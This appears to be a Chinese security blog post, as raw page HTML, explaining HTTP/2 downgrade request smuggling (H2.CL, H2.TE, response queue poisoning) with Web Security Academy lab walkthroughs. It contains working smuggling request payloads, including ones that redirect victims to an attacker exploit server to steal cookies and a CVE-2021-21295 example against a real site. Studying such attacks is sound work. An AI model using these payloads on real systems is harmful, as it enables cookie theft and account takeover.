@@ -1,0 +1,534 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HTTP2 request smuggling | yake-daigua</title><meta name="keywords" content="HTTP Request Smuggling"><meta name="author" content="yake-daigua"><meta name="copyright" content="yake-daigua"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言最近看了一些HTTP请求走私的文章，都是基于HTTP&#x2F;1.1的。HTTP&#x2F;2.0已经发布多年，是否存在走私问题？进行检索后发现文章大都是讲H2C的，关于HTTP2的安全问题没有细致的讲解。在Black Hat USA 2021上，James Kettle演讲了议题：《HTTP&#x2F;2: The Sequel is Always Worse》。经过一段时间的阅读，写下这">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTP2 request smuggling">
+<meta property="og:url" content="https://yake-daigua.top/2022/11/25/HTTP2%20request%20smuggling/index.html">
+<meta property="og:site_name" content="yake-daigua">
+<meta property="og:description" content="前言最近看了一些HTTP请求走私的文章，都是基于HTTP&#x2F;1.1的。HTTP&#x2F;2.0已经发布多年，是否存在走私问题？进行检索后发现文章大都是讲H2C的，关于HTTP2的安全问题没有细致的讲解。在Black Hat USA 2021上，James Kettle演讲了议题：《HTTP&#x2F;2: The Sequel is Always Worse》。经过一段时间的阅读，写下这">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/221125121515.jpg">
+<meta property="article:published_time" content="2022-11-25T04:12:08.000Z">
+<meta property="article:modified_time" content="2022-11-25T04:15:58.948Z">
+<meta property="article:author" content="yake-daigua">
+<meta property="article:tag" content="HTTP Request Smuggling">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/221125121515.jpg"><link rel="shortcut icon" href="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg"><link rel="canonical" href="https://yake-daigua.top/2022/11/25/HTTP2%20request%20smuggling/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTTP2 request smuggling',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-25 12:15:58'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/mycss.css"><link rel="stylesheet" href="/css/mycss2.css"><link rel="stylesheet" href="/css/mycss3.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/微信图片_20220920163546.jpg" onerror="onerror=null;src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/221125121515.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">yake-daigua</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 更多</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/about/"><i class="fa-fw fa fa-street-view"></i><span> 笔者</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-heartbeat"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa fa-video-camera"></i><span> 番剧</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HTTP2 request smuggling</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-25T04:12:08.000Z" title="发表于 2022-11-25 12:12:08">2022-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-25T04:15:58.948Z" title="更新于 2022-11-25 12:15:58">2022-11-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/HTTP-Request-Smuggling/">HTTP Request Smuggling</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HTTP2 request smuggling"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近看了一些HTTP请求走私的文章，都是基于HTTP&#x2F;1.1的。HTTP&#x2F;2.0已经发布多年，是否存在走私问题？进行检索后发现文章大都是讲H2C的，关于HTTP2的安全问题没有细致的讲解。在<strong>Black Hat USA 2021</strong>上，James Kettle演讲了议题：<strong>《HTTP&#x2F;2: The Sequel is Always Worse》</strong>。经过一段时间的阅读，写下这篇文章。如果有描述错误的地方，还请各位师傅指正。</p>
+<h1 id="HTTP-x2F-2"><a href="#HTTP-x2F-2" class="headerlink" title="HTTP&#x2F;2"></a>HTTP&#x2F;2</h1><p>首先介绍一下HTTP2与HTTP1的一些差别。</p>
+<h3 id="二进制传输"><a href="#二进制传输" class="headerlink" title="二进制传输"></a>二进制传输</h3><p>与HTTP1纯文本形式报文传输不同，HTTP2将请求和响应数据分割为更小的帧，进行二进制编码传输。HTTP2所有性能增强的核心就在于新的二进制分帧层，它定义了如何封装http消息并在客户端与服务器之间传输。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/0fd12dac28bb389450.jpg" alt="0fd12dac28bb389450"></p>
+<h3 id="Header压缩"><a href="#Header压缩" class="headerlink" title="Header压缩"></a>Header压缩</h3><p>在上面的图中可以看见HTTP1与HTTP2的请求区别。HTTP2将请求报文替换成了一系列伪标头。格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">:method - The request method</span><br><span class="line">:path - The request path. Note that this includes the query string</span><br><span class="line">:authority - The Host header, roughly</span><br><span class="line">:scheme - The request scheme, typically &#x27;http&#x27; or &#x27;https&#x27;</span><br><span class="line">:status - The response status code - not used in requests</span><br></pre></td></tr></table></figure>
+
+<p>PS：</p>
+<ol>
+<li>这种方式只是在<code>Burp</code>的<code>Inspector</code>中表示，在网络传输过程中并不长这样。</li>
+<li>采用这种方式方便对漏洞原理进行讲解。</li>
+</ol>
+<h3 id="消息长度"><a href="#消息长度" class="headerlink" title="消息长度"></a>消息长度</h3><p>因为二进制的传输，HTTP的请求消息长度也进行了调整。</p>
+<p>HTTP1需要查找 <code>：</code>才能确定请求头名称的结束，但是HTTP2是基于预定义的偏移量进行解析，消息长度几乎不可能产生歧义。</p>
+<p>在HTTP1中，请求走私的利用都是基于<code>Content-Length</code>和<code>Transfer-Encoding</code>前后端解析的差异性和混淆。</p>
+<h1 id="HTTP-x2F-2降级"><a href="#HTTP-x2F-2降级" class="headerlink" title="HTTP&#x2F;2降级"></a>HTTP&#x2F;2降级</h1><p>由于HTTP2不是特别成熟，一般支持HTTP2的web服务器仍然会与只支持HTTP1的后端基础设施进行通信。</p>
+<p>所以尽管前端服务器与客户端使用HTTP2，在将请求转发到后端时将请求重写为HTTP1。当只支持HTTP1的后端发出 响应时，前端会把它重写为HTTP2返回给客户端。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/http2-http1-mapping.jpg" alt="http2-http1-mapping"></p>
+<p>HTTP&#x2F;2 内置的长度机制意味着，当使用 HTTP 降级时，可能存在三种不同的方式来指定同一请求的长度，这就导致了HTTP2请求走私的产生。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/4c32-article-http2-desync.png" alt="4c32-article-http2-desync"></p>
+<blockquote>
+<p>HTTP&#x2F;2 降级非常普遍，甚至是许多流行的反向代理服务的默认行为。在某些情况下，甚至没有禁用它的选项。</p>
+</blockquote>
+<h1 id="H2-CL"><a href="#H2-CL" class="headerlink" title="H2.CL"></a>H2.CL</h1><p>在降级期间，前端服务器通常会加入一个HTTP1中的请求头<code>Content-Length</code>，它的大小根据HTTP2内置长度机制来获取。但是如果在降级前HTTP2请求中就已经有了<code>Content-Length</code>，那么该字段在<code>Http2MultiplexHandler</code>向上传播时不会被验证，它在重写HTTP2的时候直接利用。因此与HTTP1中的<code>TE.CL</code>一样，我们可以利用<code>Content-Length</code>来误导前端服务器，固定请求结束的位置。从而进行走私。</p>
+<blockquote>
+<p>H2.CL需要以下条件都满足：</p>
+<ul>
+<li><code>HTTP2MultiplexCodec</code>或被<code>Http2FrameCodec</code>使用</li>
+<li><code>Http2StreamFrameToHttpObjectCodec</code>用于转换为 HTTP&#x2F;1.1 对象</li>
+<li>这些 HTTP&#x2F;1.1 对象被转发到另一个远程对等点。</li>
+</ul>
+</blockquote>
+<p>假设我们以HTTP2发送的格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:method				POST</span><br><span class="line">:path				/</span><br><span class="line">:authority 			aaa.com</span><br><span class="line">:Content-Length 	0</span><br><span class="line">:Content-Type		application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Host: aaa.com</span><br></pre></td></tr></table></figure>
+
+<p>在解析为HTTP1时会变为如下格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /example HTTP/1.1</span><br><span class="line">Host: aaa.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Host: aaa.com</span><br></pre></td></tr></table></figure>
+
+<p>在后端解析时，<code>/admin</code>这个请求会被存入缓冲区进行利用。这和TE.CL的利用类似，都可以重定向捕捉用户信息。一般情况下，我们的<code>Content-Length</code>会比我们请求消息长度要长，这是为了只走私请求头，使得后来的请求不会被独立出来。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221117232500937.png" alt="image-20221117232500937"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /example HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=1GET / H</span><br></pre></td></tr></table></figure>
+
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p><strong>Burp Suite的版本要高于2021.9.1才能发送HTTP2请求。</strong></p>
+<p>实验目的：通过H2.CL实现请求走私，捕获用户的Cookie值。</p>
+<p>首先我们需要进行一些设置，禁用Update-CL，<strong>勾选Allow HTTP&#x2F;2 ALPN override并且把协议改为HTTP2</strong>。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/20221117214355.png" alt="20221117214355"></p>
+<p>我们连续发送请求包两次，能够发现第二次请求是404，说明走私成功了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0ae00073049168e6c06d1f6300e30012.web-security-academy.net</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">GET /resources HTTP/1.1</span><br><span class="line">Host: exploit-0a6a00ab04e56828c0121fe101370067.exploit-server.net</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line"></span><br><span class="line">//设置Content-Length: 10是因为需要把下一个数据包进来的请求头给挤掉，不然后端会认为是两个请求。</span><br></pre></td></tr></table></figure>
+
+<p>构造一个重定向到我们的恶意链接，使用户导入我们的js。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221117220554581.png" alt="image-20221117220554581"></p>
+<p>发送一次先前构造的数据包，然后在vps上等待一会，观察日志。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221117220811562.png" alt="image-20221117220811562"></p>
+<p>可以看到有用户被重定向到我们的恶意网站了。</p>
+<h3 id="CVE-2021-21295"><a href="#CVE-2021-21295" class="headerlink" title="CVE-2021-21295"></a>CVE-2021-21295</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: www.netflix.com</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">abcdGET /n HTTP/1.1</span><br><span class="line">Host: 02.rs?x.netflix.com</span><br><span class="line">Foo: bar</span><br></pre></td></tr></table></figure>
+
+<p>与上面的场景一模一样，根据重定向执行js窃取数据。</p>
+<h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>用户可以通过实现<code>ChannelInboundHandler</code>放在<code>ChannelPipeline</code>后面的自定义来自己进行验证<code>Http2StreamFrameToHttpObjectCodec</code>。</p>
+<h1 id="H2-TE"><a href="#H2-TE" class="headerlink" title="H2.TE"></a>H2.TE</h1><p>因为HTTP2不兼容<code>Transfer-Encoding</code>，所以经常会忽略它，如果没有在前端把<code>Transfer-Encoding: chunked</code>过滤掉，那么也能在HTTP2降级时请求走私。</p>
+<p>假设我们以HTTP2发送的格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">:method				POST</span><br><span class="line">:path				/</span><br><span class="line">:authority 			aaa.com</span><br><span class="line">:Transfer-Encoding 	chunked</span><br><span class="line">:Content-Type		application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: aaa.com</span><br><span class="line">Foo: bar</span><br></pre></td></tr></table></figure>
+
+<p>在解析为HTTP1时会变为如下格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /example HTTP/1.1</span><br><span class="line">Host: aaa.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: aaa.com</span><br><span class="line">Foo: bar</span><br></pre></td></tr></table></figure>
+
+<h1 id="响应队列中毒"><a href="#响应队列中毒" class="headerlink" title="响应队列中毒"></a>响应队列中毒</h1><p><strong>简介</strong></p>
+<p>响应队列中毒是一种强大的请求走私攻击形式，它会导致前端服务器开始将来自后端的响应映射到错误的请求。实际上，这意味着同一前端&#x2F;后端连接的所有用户都是持久服务的响应，这些响应是为其他人准备的。</p>
+<p>这是通过走私一个完整的请求来实现的，从而在前端服务器只进行一次响应时从后端引出两个响应。</p>
+<p>响应队列中毒所带来的危害是灾难性的，因为后端识别为两个响应，所以只需要一次投毒，下一次请求时就能捕获其他用户的响应。这是一个可持续的过程。</p>
+<p>响应队列中毒还会造成重大的附带损害，有效地破坏通过同一 TCP 连接将流量发送到后端的任何其他用户的站点。在尝试正常浏览站点时，用户会从服务器收到看似随机的响应，使得网站业务没办法继续进行。</p>
+<p><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/image-20221117235052057.png" alt="image-20221117235052057"></p>
+<p><strong>条件</strong></p>
+<p>1、前端服务器和后端服务器的TCP链接可以被重复使用。</p>
+<p>2、能进行一个完整、独立请求的走私，并且能够被后端所处理。</p>
+<p>3、服务器在收到无效请求时不会关闭TCP连接。</p>
+<p><strong>实施</strong></p>
+<p>如果我们走私一个包含请求消息的请求，那它一定是基于CL实现的，后端看到的最后一个请求（即用户进来的请求）只是一系列剩余字节，不能构成有效请求，通常还会报错，导致服务器TCP连接的关闭。</p>
+<p>前端CL:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /example HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">x=GET / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">//前端进来从x=开始（包括x=），后面都是第二个POST的内容</span><br></pre></td></tr></table></figure>
+
+<p>后端TE：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: x-www-form-urlencoded</span><br><span class="line">Content-Length: 120</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /example HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: x-www-form-urlencoded</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">x=GET / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">//第二个POST中Content-Length: 25，那么截止最后一行Host: v为止，前面都是第二个POST的内容。ulnerable-website.com就成为了剩余字节，不能构成有效请求。</span><br></pre></td></tr></table></figure>
+
+<p>正确走私一个完整的请求内容如下：</p>
+<p>前端CL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">Content-Type: x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 61\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /anything HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p>后端TE：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">Content-Type: x-www-form-urlencoded\r\n</span><br><span class="line">Content-Length: 61\r\n</span><br><span class="line">Transfer-Encoding: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /anything HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: vulnerable-website.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<p>这样就都是有效请求了，能够完整响应队列的投毒。</p>
+<h3 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h3><p>实验目的：通过响应队列投毒窃取admin用户的cookie，进入admin页面删除用户carlos。(H2.TE)</p>
+<p>打开实验环境，还是先测一下404，后端为<code>Transfer-Encoding</code>，和HTTP1的CL.TE类似。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0aa200d404cce7c3c09e037a00440013.web-security-academy.net</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 13</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure>
